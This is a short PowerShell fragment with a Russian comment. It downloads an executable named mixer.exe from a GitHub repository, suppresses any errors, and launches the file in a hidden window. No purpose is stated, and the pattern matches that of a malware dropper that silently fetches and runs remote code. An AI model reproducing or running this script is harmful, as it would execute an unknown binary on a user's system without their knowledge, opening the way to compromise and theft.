Invoke-WebRequest -Uri "https://github.com/svhosf/-/raw/refs/heads/main/mixer.exe" -OutFile "mixer.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "mixer.exe" -WindowStyle Hidden
